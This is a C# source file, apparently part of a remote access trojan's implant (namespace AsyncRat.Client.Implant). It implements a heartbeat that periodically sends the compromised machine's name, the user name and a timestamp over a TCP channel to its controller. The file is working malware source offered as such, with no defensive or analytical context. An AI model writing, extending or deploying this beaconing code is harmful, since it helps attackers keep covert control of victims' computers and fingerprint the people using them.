using System.Text;
using AsyncRat.Client.Network;

namespace AsyncRat.Client.Implant;

public sealed class Heartbeat
{
    private readonly TcpChannel _channel;
    private readonly TimeSpan _interval;
    private DateTimeOffset _lastSent;
    private long _beatCount;

    public long BeatCount => Interlocked.Read(ref _beatCount);
    public DateTimeOffset LastSentAt => _lastSent;

    public event Action<long>? OnBeat;

    public Heartbeat(TcpChannel channel, TimeSpan interval)
    {
        _channel = channel;
        _interval = interval;
    }

    public async Task RunAsync(CancellationToken ct = default)
    {
        while (!ct.IsCancellationRequested && _channel.IsConnected)
        {
            await Task.Delay(_interval, ct);

            var payload = BuildBeatPayload();
            await _channel.SendAsync(payload, ct);

            _lastSent = DateTimeOffset.UtcNow;
            var count = Interlocked.Increment(ref _beatCount);
            OnBeat?.Invoke(count);
        }
    }

    private byte[] BuildBeatPayload()
    {
        var ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
        var msg = $"BEAT|{ts}|{Environment.MachineName}|{Environment.UserName}";
        return Encoding.UTF8.GetBytes(msg);
    }

    public void Reset()
    {
        Interlocked.Exchange(ref _beatCount, 0);
        _lastSent = default;
    }
}
